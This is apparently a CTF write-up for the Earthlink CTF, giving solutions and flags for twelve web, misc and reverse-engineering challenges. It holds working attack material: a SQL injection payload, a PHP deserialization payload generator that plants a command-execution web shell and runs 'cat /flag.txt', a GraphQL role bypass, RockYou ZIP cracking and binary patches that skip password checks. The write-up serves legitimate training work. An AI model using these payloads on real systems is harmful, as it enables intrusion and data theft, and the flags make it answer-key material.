# Earthlink CTF


**1 - Challenge Name**: [ FragFragFrag ]

**Category:** **Web Security**
**Points**:** **10**

**Solution:**

Accessed the web application with a single input field. The challenge name hinted at using # symbols.
Entered ### (three #) based on the name. The response indicated I was on the right track but needed adjustment
Tried #### (four #) which gave a similar response indicating progress.
Entered ##### (five #) and solved the challenge, revealing the flag.

![image](https://raw.githubusercontent.com/AmmarM0hammed/Earthlink-Ctf/refs/heads/main/1.png))


> **Flag:** **EL{EL-FRAGGGGGGGGGGGGGGGMENT_S33_1TS_S0_34SY}**

**2 - Challenge Name**: [ **Little Endian route** ]



**Category:** Web Security  
**Points:** 15


**Solution:**

1 - Accessed the web application, which returned the string: \\x64\\x61\\x64\\x68\\x67\\x61\\x62.
2 - nitially tried decoding it directly as Little Endian and as a path, yielding "Baghdad" but it didn't work.
3 - Reviewed the challenge name and description, noticing "post" was mentioned.
4 - Reversed the given string, removed the \\x, resulting in: 62616768646164.
5 - Used this value as the path and sent a POST request.
6 - Successfully retrieved the flag.


> **Flag : EL{good_job_Conan}**


**3 - Challenge Name**: [   **Masked Entry** ]

**Category:** Web Security  
**Points:** 50


**Challenge Description:**

The service is designed to record web attacks using a unique UUID for each attempt. However, a vulnerability in the UUID search mechanism, known as UUID Injection, allows malicious SQL payloads to manipulate the backend database.


**Solution:**

**1. Analyze Input Behavior:**

-   The application processes user-supplied UUIDs for searching records.
-   Testing with a UUID prefix, such as 7s4a, returned valid results, indicating backend server processing.

**2. Craft the Payload:**

-   Discovered the application is vulnerable to SQL injection through the UUID input.
-   Crafted the SQL injection payload:


>      7'or 1=1-'xxx-xxxx-xxxx-'limit 25,1;


![image](https://raw.githubusercontent.com/AmmarM0hammed/Earthlink-Ctf/refs/heads/main/3%20(3).jpg)

**Payload Breakdown:**

-   7'or 1=1-: Closes the UUID string and introduces a condition (1=1) that always evaluates true.
-   'xxx-xxxx-xxxx-': Acts as a placeholder to maintain the UUID format.
-   limit 25,1;: Extracts the 25th record, targeting specific data.

**3. Execute the Attack:**

-   Submitted the crafted payload in the vulnerable input field.
-   The server executed the query, bypassing security filters.

> Flag: EL-FLAG{injection_easy_winnnnnnnnnn}



**4 - Challenge Name**: [ Switcher Gone Wrong*]
**Category:** Web Security  
**Points:** 50

**Challenge Description:**

The challenge involves exploiting PHP object serialization/deserialization vulnerabilities. The provided functionality processes user preferences via serialized objects, making it vulnerable to PHP Object Injection (POI).

**1. Understanding Client-Side Functionality:**

-   The provided JavaScript function setTheme encodes a serialized PHP object as Base64 and sets it as a cookie:


    function setTheme(theme) {
        const prefs = {theme: theme};
        const serialized = `O:9:"UserPrefs":1:{s:5:"theme";s:${theme.length}:"${theme}";}`;
        document.cookie = `user_theme=${btoa(serialized)}; path=/`;
        location.reload();
    }

   **Observations:**
-   The cookie is deserialized on the backend using PHP's unserialize() function.
-   This hints at a possible PHP Object Injection attack.

**2. Exploring the Backend:**

-   Examined /robots.txt and found the following hints:
- Secret Note: Common debug class to check - SecretLogger
- Dev Note: Check logger configuration for file paths
- Debug log properties: logFile, data

**Discovered a backend class SecretLogger with exploitable properties: logFile and data.**

**3. Crafting the Exploit Payload:**

-   Using the SecretLogger class, constructed a PHP payload to create a reverse shell. Below is the payload generator script:

    > **<?php**
    > 
    > **class SecretLogger {**
    > 
    > **public $logFile;**
    > 
    > **public $data;**
    > 
	    > **	function __construct($logFile, $data) {**
	    > 
	    > **	$this->logFile = $logFile;**
	    > 
	    > **	$this->data = $data;** **}**
 
    > **}**
    > 
    > **// Malicious PHP code for reverse shell**
    > 
    > **	$phpCode = "<?php if(isset(\$_GET['cmd'])) {system(\$_GET['cmd'] . ' 2>&1');}";**
    > 
    > **// Creating the payload**
    > 
    > **	$data = new SecretLogger("j0k3r_revSh3ll.php", $phpCode);**
    > 
    > **	$serialized = serialize($data);**
    > 
    > **// Base64-encoding the payload**
    > 
    > **echo base64_encode($serialized);**
    > 
    > **?>**

**Explanation of Payload:**

-   logFile: The filename for the malicious PHP file (j0k3r_revSh3ll.php).
-   data: The malicious PHP code that allows command execution via the cmd parameter.

**4. Setting the Malicious Cookie:**

-   Ran the PHP script to generate the Base64-encoded payload:

**php payload_generator.php**

**Used the generated payload to set the user_theme cookie in the browser:**

**const payload = "BASE64_PAYLOAD_HERE";**

**document.cookie = `user_theme=${payload}; path=/`;**

**5. Triggering the Vulnerability:**

-   Reloaded the page to trigger the backend's deserialization process.
-   The server created the malicious PHP file (j0k3r_revSh3ll.php) on the target system.

**6. Executing Commands:**

-   Accessed the uploaded PHP file via:

**https://earthlink-iq-portal.chals.io/j0k3r_revSh3ll.php**

**Used the cmd parameter to execute commands. For example:**

**https://earthlink-iq-portal.chals.io/j0k3r_revSh3ll.php?cmd=cat /flag.txt**

    **Flag: EL-CTF{PHP_D3s3r_M4g1c_M3th0ds}**


**5 - Challenge Name**: [   Internal Access ]
**Category:** Web Security  
**Points:** 50

<![endif]-->

**Solution:**

**Step 1: Schema Discovery**

-   **Used the GraphQL introspection query to reveal the schema:**

**{**

**__schema {**

**types {**
	**name**
	**fields {**
			**name**
			**args {**
					**name**
					**description**
					**type {**
							**name**
							**kind**
						**}**
					**}**
				**}**
			**}**
		**}**
**}**

Found two queries: userInfo and getSecret.
**Step 2: Username Enumeration**
-   **Queried userInfo to test usernames. Identified superadmin as holding the flag.**
**Step 3: Exploiting the Vulnerability**
-   **The getSecret query required a role header. Bypassed authentication by setting role to superadmin:**
**{**
		**getSecret(role: "SUPERADMIN") {**
		**__typename**
		**content**
	**}**
**}**

**Retrieved the flag successfully.**

![image](https://raw.githubusercontent.com/AmmarM0hammed/Earthlink-Ctf/refs/heads/main/5.jpg)

    EL-CTF{gr4phq1_1ntrOsp3ct10n_m4st3r}


**6 - Challenge Name**: [ HorseCode ]
**Category:** Misc  
**Points:** 50


**Solution:**

**Challenge Details:**
The challenge provided an audio file encoded in Morse code.
**Approach:**
	Uploaded the audio file to an online Morse code decoder:  
	[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

	Decoded the Morse code to reveal the flag.
	Result:
	The decoded flag: 
    ELCTF{PEEPP0PP33PPOP}


**7 - Challenge Name**: [ ExitTool]
**Category:** Misc  
**Points:** 10

**Solution:**

**Challenge Details:**
The challenge provided a file with metadata (EXIF data).
Approach:
Examined the EXIF data of the file and found a Base64-encoded string:  

    RUxDVEZ7ZXhpX29yX2V4aXRfZG9lc19pdF9tYXR0ZXJ9
Decoding:
Used the base64 command to decode the string:

**Flag:** 

    ELCTF{exif_or_exit_does_it_matter}

**8 - Challenge Name**: [ weWill ]
**Category:** Misc  
**Points:** 10

**Challenge Details:**

-   The challenge provided a password-protected ZIP file.

**Approach:**

-   Used a password-cracking tool to attack the ZIP file with a common password list (e.g., **RockYou**).
-   After running the attack, the password for the ZIP file was identified as **cingular**.

**Extracting the Flag:**

-   Opened the ZIP file using the cracked password (**cingular**) and extracted its contents.
-   Found the flag inside one of the extracted files.

**Result:**

-   Successfully retrieved the flag.

![image](https://github.com/AmmarM0hammed/Earthlink-Ctf/blob/main/8.jpg?raw=true)

    ELCTF{w3_wIL1_r0Ck_You}



**9 - Challenge Name**: [ Arm And Leg]
**Category:** Misc  
**Points:** 10
**Solution:**

**Challenge Details:**

The challenge provided a binary file named armAndLeg.
Using the file command, it was identified as an ARM aarch64 executable:
ELF 64-bit LSB executable, ARM aarch64, statically linked, stripped

**Approach:**
-   Since the binary was built for the ARM aarch64 architecture, it could not run natively on an x86/x64 machine.
-   Used an emulator like **QEMU** to execute the ARM aarch64 binary.

**Execution:**

-   Ran the binary using QEMU for the aarch64 architecture and successfully executed it:
qemu-aarch64 armAndLeg
The output revealed the flag.

![image](https://github.com/AmmarM0hammed/Earthlink-Ctf/blob/main/9.jpg?raw=true)

**Flag:** ELCTF{arm$_are_h@ndy}

**10 - Challenge Name**: [My New Safe]
**Category:** Reverse Engineering
**Points:** 85


**Solution:**

**Challenge Details:**

The binary checks a password at a specific memory location: 0x0000000140001110.

The challenge involves bypassing the password check using reverse engineering.

**Analysis:**
Disassembled the binary and identified a conditional jump instruction at 0x7FF6902A1117.

The instruction's original opcode was:
0F 85 5D 01 00 00
-   This represents a conditional jump (JNZ) that skips the success block if the password is incorrect.
**Bypassing the Check:**
-   To bypass the password check, patched the binary to always allow access by modifying the conditional jump:
Changed 0F 85 5D 01 00 00 to 0F 85 00 00 00 00
-   This change ensures the jump always occurs regardless of the password, effectively bypassing the password validation.
**Execution:**
-   Saved the patched binary and executed it.
-   Successfully bypassed the password check and retrieved the flag.

![image](https://github.com/AmmarM0hammed/Earthlink-Ctf/blob/main/10.jpg?raw=true)

**Flag :**

     ELCTF{rE_!$_nICE}

**11 - Challenge Name**: [pyCrypter]
**Category:** Reverse Engineering
**Points:** 70



**Solution:**

**Challenge Overview:**
The provided script encrypts a flag using a custom method (myencode) with the key "MySecretKey".
Encrypted data is Base64-encoded and stored in flag.txt.enc.
**Decryption Process:**
Reverse the encryption by decoding the Base64 data and subtracting the key's ASCII values cyclically.
**Decryption Script:**

    import base64
    def mydecode(encodedFlag, key):
    decodedBytes = base64.urlsafe_b64decode(encodedFlag)
    return ''.join(chr((decodedBytes[i] - ord(key[i % len(key)])) % 256) for i in range(len(decodedBytes)))
    with open("flag.txt.enc", "rb") as f:
    encryptedData = f.read()
    flag = mydecode(encryptedData, "MySecretKey")
    print("Flag:", flag)

**Result:**
**Running the script decrypts the flag.**

**Flag: 

    EL{obfu$ca71on_1s_n0t_$3cUrE}**



**12 - Challenge Name: ** [ patchMe ]

**Category:** Reverse Engineering  
**Points:** 70

**Solution:**
**Challenge Overview:**
**The program performs operations on a series of values and has an overflow check implemented in sub_140001000.**
**The goal is to bypass this check and retrieve the flag.**

**Analysis:**

Using a disassembler (e.g., IDA Pro), identified the overflow check in sub_140001000.
This function causes the program to exit or behave undesirably when the condition is triggered.
**Bypassing the Check:**
**Patched the binary by replacing the sub_140001000 instruction with NOPs (No Operation) to skip the overflow check entirely.**

**Result:**
**After patching, the program executed successfully and printed the flag.**

![image](https://github.com/AmmarM0hammed/Earthlink-Ctf/blob/main/12.jpg?raw=true)

Flag: 

    ELCTF{p@tCh_me_Cr@cK_mE}

